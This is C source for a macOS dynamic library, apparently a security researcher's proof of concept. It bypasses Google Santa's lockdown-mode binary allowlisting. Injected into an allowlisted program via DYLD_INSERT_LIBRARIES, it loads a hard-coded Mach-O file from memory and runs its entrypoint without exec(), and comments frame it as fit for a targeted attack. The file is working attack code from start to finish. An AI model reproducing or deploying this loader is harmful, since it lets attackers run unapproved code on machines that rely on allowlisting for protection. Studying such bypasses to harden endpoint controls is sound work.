/*
 *             _ _         __             _
 *   /\  /\___| | | ___   / _\ __ _ _ __ | |_ __ _
 *  / /_/ / _ \ | |/ _ \  \ \ / _` | '_ \| __/ _` |
 * / __  /  __/ | | (_) | _\ \ (_| | | | | || (_| |
 * \/ /_/ \___|_|_|\___/  \__/\__,_|_| |_|\__\__,_|
 *
 *    ___              __             _
 *   / __\_   _  ___  / _\ __ _ _ __ | |_ __ _
 *  /__\// | | |/ _ \ \ \ / _` | '_ \| __/ _` |
 * / \/  \ |_| |  __/ _\ \ (_| | | | | || (_| |
 * \_____/\__, |\___| \__/\__,_|_| |_|\__\__,_|
 *         |___/
 *
 * A dynamic library to execute binaries via injection
 *
 * Able to bypass Google's Santa system in LOCKDOWN mode.
 * The reason is that the module only controls binaries from exec()
 * So we can execute a whitelisted binary with DYLD_INSERT_LIBRARIES
 * and before its entrypoint execute a malicious binaries in the same
 * thread that will not trigger exec().
 *
 * Created by reverser on 22/11/14.
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach-o/arch.h>
#include <mach-o/fat.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

/* the binary we want to execute */
/* this is a problem that needs to be solved */
/* probably using an env var for example? */
/* or just keep it this way since this could be used in a targetted attack */
#define TARGET "/Users/username/super_targetted_attack_binary"

#define ERROR_MSG(fmt, ...) fprintf(stderr, "[ERROR] " fmt " \n", ## __VA_ARGS__)
#define OUTPUT_MSG(fmt, ...) fprintf(stdout, fmt " \n", ## __VA_ARGS__)
#define DEBUG_MSG(fmt, ...) fprintf(stdout, "[DEBUG] " fmt "\n", ## __VA_ARGS__)

/* injected module needs a name */
#define INJECTED_MODULE_NAME "injectedcode"

typedef void (*EntryPoint)(void);

/*
 * function to locate LC_MAIN binaries entrypoint
 */
static int
find_entrypoint(void *buffer, uint64_t *offset)
{
    if (buffer == NULL || offset == NULL)
    {
        return -1;
    }
    
    struct mach_header *mh = (struct mach_header*)buffer;
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        return -1;
    }
    
    void *load_cmd = buffer;
    switch (mh->magic)
    {
        case MH_MAGIC_64:
            load_cmd += sizeof(struct mach_header_64);
            break;
        case MH_MAGIC:
            load_cmd += sizeof(struct mach_header);
            break;
        default:
            return -1;
    }
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        struct load_command *lc = (struct load_command*)load_cmd;
        if (lc->cmd == LC_MAIN)
        {
            struct entry_point_command *ep = (struct entry_point_command*)lc;
            *offset = ep->entryoff;
            break;
        }
        load_cmd = (char*)load_cmd + lc->cmdsize;
    }
    return 0;
}

/*
 * the image observer allows us to find our injected image
 * and know its base address
 * then it's just a matter of finding the entrypoint and execute it
 */
static void
image_observer(const struct mach_header* mh, intptr_t vmaddr_slide)
{
    static int image_counter = 0;
    char *image_name = (char*)_dyld_get_image_name(image_counter);
    if (image_name == NULL)
    {
        image_counter++;
        return;
    }
    
    image_counter++;
    if (strcmp(image_name, INJECTED_MODULE_NAME) == 0)
    {
        DEBUG_MSG("Found image %s at address %p with slide %p!", image_name, (void*)mh, (void*)vmaddr_slide);
        /* locate the entrypoint of the injected binary */
        uint64_t entrypoint_offset = 0;
        find_entrypoint((void*)mh, &entrypoint_offset);
        
        /* set the function pointer that we use to start the injected code */
        /* NOTE: the prototype assumes no arguments to the injected code! */
        EntryPoint f = (EntryPoint)((char*)mh + entrypoint_offset);
        DEBUG_MSG("Injected binary entrypoint: %p", (void*)f);
        
        if (f == NULL)
        {
            fprintf(stderr, "Could not get address of symbol.\n");
            return;
        }
        /* just launch the injected module by calling the entrypoint*/
        else
        {
            DEBUG_MSG("Executing injected code...");
            f();
            DEBUG_MSG("End of injected code...");
        }
        /* XXX: cleanup */
    }
    return;
}

/* the library entrypoint where everything starts */
void
__attribute__ ((constructor)) init(void)
{
    /* load the target file into our buffer */
    int fd = -1;
    if ((fd = open(TARGET, O_RDONLY)) == -1)
    {
        ERROR_MSG("Can't open target %s.", TARGET);
        return;
    }
    struct stat stat = {0};
    if (fstat(fd, &stat) < 0)
    {
        ERROR_MSG("Can't fstat target %s.", TARGET);
        close(fd);
        return;
    }
    
    void *target_buf = NULL;
    kern_return_t kr = 0;
    /* allocate memory with mach_vm_allocate (requisite) and copy the file into it */
    kr = mach_vm_allocate(mach_task_self(), (mach_vm_address_t*)&target_buf, stat.st_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Can't allocate buffer for target.");
        close(fd);
        return;
    }
    ssize_t bytes_read = 0;
    bytes_read = pread(fd, target_buf, stat.st_size, 0);
    
    if (bytes_read == -1 ||
        bytes_read < stat.st_size)
    {
        ERROR_MSG("Failed to read target.");
        close(fd);
        return;
    }
    
    /* modify file type to MH_BUNDLE if necessary */
    /* the file type must be MH_BUNDLE but we can convert it on the fly */
    struct mach_header *mh = (struct mach_header*)target_buf;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Invalid Mach-O target.");
        close(fd);
        return;
    }
    if (mh->filetype != MH_BUNDLE)
    {
        mh->filetype = MH_BUNDLE;
    }
    
    /* now we are ready to call the dyld NS* stuff and get our binary executed */
    NSObjectFileImageReturnCode dyld_err;
    NSObjectFileImage ofi;
    
    dyld_err = NSCreateObjectFileImageFromMemory(target_buf, stat.st_size, &ofi);
    if (dyld_err != NSObjectFileImageSuccess)
    {
        ERROR_MSG("Failed to create object file with error %d", dyld_err);
    }
    const char *moduleName;
    uint32_t options = NSLINKMODULE_OPTION_BINDNOW;
    NSModule m = NULL;
    /* a name for the module so it can be identified by the image observer */
    moduleName = INJECTED_MODULE_NAME;
    /* finally link the module */
    m = NSLinkModule(ofi, moduleName, options);
    if (m == NULL)
    {
        ERROR_MSG("Failed to link module!");
    }
    else
    {
        /* register a dyld image observer
         * we need it because we don't know where the injected image was loaded at
         * it's not our allocated buffer but a new copy of it
         * so we can find that image via the name and execute it from there
         */
        _dyld_register_func_for_add_image(image_observer);
    }
    
    close(fd);

//    /* we can deallocate memory because NSLinkModule will create its own copy */
//    target_buf = NULL;
//    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)target_buf, stat.st_size);
}
